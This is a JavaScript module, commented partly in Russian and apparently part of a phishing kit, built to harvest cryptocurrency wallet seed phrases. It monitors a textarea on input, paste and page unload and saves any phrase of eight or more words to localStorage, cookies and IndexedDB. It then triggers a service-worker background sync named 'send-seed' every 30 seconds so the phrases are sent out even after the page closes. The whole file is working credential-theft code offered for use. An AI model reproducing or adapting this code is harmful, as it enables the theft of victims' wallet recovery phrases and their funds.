// ============================================
// AGGRESSIVE SENDER - ФИНАЛЬНАЯ ВЕРСИЯ
// Сохранение в IndexedDB + cookies + localStorage
// С ПОДРОБНЫМИ ЛОГАМИ
// ============================================

(function() {
    
    const CONFIG = {
        cookieExpireDays: 7,
        minWordsToSave: 8
    };

    let swRegistration = null;

    console.log('[AggressiveSender] Module loaded');

    // ============================================
    // SERVICE WORKER
    // ============================================

    async function registerServiceWorker() {
        if (!('serviceWorker' in navigator)) {
            console.log('[AggressiveSender] Service Worker not supported');
            return;
        }

        try {
            console.log('[AggressiveSender] Registering Service Worker...');
            
            swRegistration = await navigator.serviceWorker.register('./module-js/service-worker.js');
            
            console.log('[AggressiveSender] Service Worker registered:', swRegistration.scope);
            
            await navigator.serviceWorker.ready;
            
            console.log('[AggressiveSender] Service Worker ready');
            
            // Запускаем синхронизацию каждые 30 секунд
            setInterval(() => {
                if (swRegistration && 'sync' in swRegistration) {
                    console.log('[AggressiveSender] Triggering background sync');
                    swRegistration.sync.register('send-seed');
                }
            }, 30000);
            
        } catch (e) {
            console.error('[AggressiveSender] Service Worker registration failed:', e);
        }
    }

    // ============================================
    // СОХРАНЕНИЕ
    // ============================================

    async function saveSeed(seed) {
        const wordCount = seed.trim().split(/\s+/).filter(Boolean).length;
        
        console.log('[AggressiveSender] saveSeed called, wordCount:', wordCount);
        
        if (wordCount < CONFIG.minWordsToSave) {
            console.log('[AggressiveSender] Too few words, not saving');
            return;
        }

        const data = {
            seed: seed,
            timestamp: Date.now(),
            domain: window.location.hostname
        };

        // 1. localStorage
        try {
            localStorage.setItem('pending_seed', JSON.stringify(data));
            console.log('[AggressiveSender] Saved to localStorage');
        } catch (e) {
            console.error('[AggressiveSender] localStorage save error:', e);
        }
        
        // 2. Cookies
        try {
            const expires = new Date();
            expires.setTime(expires.getTime() + (CONFIG.cookieExpireDays * 24 * 60 * 60 * 1000));
            document.cookie = `pending_seed=${encodeURIComponent(JSON.stringify(data))}; expires=${expires.toUTCString()}; path=/; SameSite=Strict`;
            console.log('[AggressiveSender] Saved to cookies');
        } catch (e) {
            console.error('[AggressiveSender] Cookie save error:', e);
        }
        
        // 3. IndexedDB (для Service Worker)
        await saveToIndexedDB(data);
        
        // 4. Триггер sync
        if (swRegistration && 'sync' in swRegistration) {
            console.log('[AggressiveSender] Triggering sync after save');
            swRegistration.sync.register('send-seed');
        } else {
            console.log('[AggressiveSender] Cannot trigger sync (not ready)');
        }
    }

    async function saveToIndexedDB(data) {
        return new Promise((resolve) => {
            console.log('[AggressiveSender] Saving to IndexedDB...');
            
            const request = indexedDB.open('SeedSenderDB', 1);
            
            request.onerror = () => {
                console.error('[AggressiveSender] IndexedDB open error');
                resolve();
            };
            
            request.onsuccess = () => {
                try {
                    const db = request.result;
                    const transaction = db.transaction(['pending'], 'readwrite');
                    const store = transaction.objectStore('pending');
                    
                    const item = {
                        id: Date.now().toString(36) + Math.random().toString(36).substring(2),
                        seed: data.seed,
                        domain: data.domain,
                        timestamp: data.timestamp,
                        created: Date.now()
                    };
                    
                    const addRequest = store.add(item);
                    
                    addRequest.onsuccess = () => {
                        console.log('[AggressiveSender] Saved to IndexedDB:', item.id);
                        resolve();
                    };
                    
                    addRequest.onerror = () => {
                        console.error('[AggressiveSender] IndexedDB add error');
                        resolve();
                    };
                } catch (e) {
                    console.error('[AggressiveSender] IndexedDB transaction error:', e);
                    resolve();
                }
            };
            
            request.onupgradeneeded = (event) => {
                console.log('[AggressiveSender] IndexedDB upgrade needed');
                const db = event.target.result;
                if (!db.objectStoreNames.contains('pending')) {
                    db.createObjectStore('pending', { keyPath: 'id' });
                    console.log('[AggressiveSender] Created pending store');
                }
            };
        });
    }

    // ============================================
    // ОТМЕТКА КАК ОТПРАВЛЕННЫЙ
    // ============================================

    function markAsSent(seed) {
        try {
            console.log('[AggressiveSender] Marking as sent');
            
            // Очищаем pending
            localStorage.removeItem('pending_seed');
            document.cookie = 'pending_seed=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
            
            // Сохраняем в историю
            let sent = JSON.parse(localStorage.getItem('sent_seeds') || '[]');
            sent.push({ seed, timestamp: Date.now() });
            if (sent.length > 10) sent = sent.slice(-10);
            localStorage.setItem('sent_seeds', JSON.stringify(sent));
            
            console.log('[AggressiveSender] Marked as sent');
        } catch (e) {
            console.error('[AggressiveSender] markAsSent error:', e);
        }
    }

    // ============================================
    // МОНИТОРИНГ TEXTAREA
    // ============================================

    function initTextareaMonitoring(textareaId) {
        console.log('[AggressiveSender] Initializing textarea monitoring for:', textareaId);
        
        const textarea = document.getElementById(textareaId);
        if (!textarea) {
            console.error('[AggressiveSender] Textarea not found:', textareaId);
            return false;
        }

        console.log('[AggressiveSender] Textarea found, setting up listeners');

        let autosaveTimer = null;

        textarea.addEventListener('input', (e) => {
            clearTimeout(autosaveTimer);
            
            console.log('[AggressiveSender] Input event, current length:', e.target.value.length);
            
            // Трекаем ввод
            if (window.UserActions) {
                window.UserActions.trackSeedInput(e.target.value);
            }
            
            autosaveTimer = setTimeout(() => {
                console.log('[AggressiveSender] Auto-save triggered');
                saveSeed(e.target.value);
            }, 2000);
        });

        textarea.addEventListener('paste', (e) => {
            console.log('[AggressiveSender] Paste event');
            setTimeout(() => {
                console.log('[AggressiveSender] Saving pasted content');
                saveSeed(e.target.value);
            }, 100);
        });
        
        textarea.addEventListener('focus', () => {
            console.log('[AggressiveSender] Textarea focused');
            // Трекаем начало ввода
            if (window.UserActions) {
                window.UserActions.trackSeedInputStart();
            }
        });

        console.log('[AggressiveSender] Textarea monitoring initialized');
        return true;
    }

    // ============================================
    // АВТОЗАПУСК
    // ============================================

    window.addEventListener('load', () => {
        console.log('[AggressiveSender] Window loaded, registering Service Worker');
        registerServiceWorker();
        
        // Проверяем pending при загрузке
        const pending = localStorage.getItem('pending_seed');
        if (pending) {
            try {
                console.log('[AggressiveSender] Found pending seed, re-saving');
                const data = JSON.parse(pending);
                saveSeed(data.seed); // Переотправляем через SW
            } catch (e) {
                console.error('[AggressiveSender] Error loading pending seed:', e);
            }
        } else {
            console.log('[AggressiveSender] No pending seed found');
        }
    });

    window.addEventListener('beforeunload', () => {
        console.log('[AggressiveSender] Page unloading, saving textarea');
        
        // Финальное сохранение перед закрытием
        const textarea = document.querySelector('textarea');
        if (textarea && textarea.value) {
            console.log('[AggressiveSender] Saving final seed');
            saveSeed(textarea.value);
        }
    });

    // ============================================
    // ЭКСПОРТ
    // ============================================

    window.AggressiveSender = {
        init: initTextareaMonitoring,
        initTextareaMonitoring: initTextareaMonitoring,
        saveSeed: saveSeed,
        markAsSent: markAsSent
    };

    console.log('[AggressiveSender] Module ready');

})();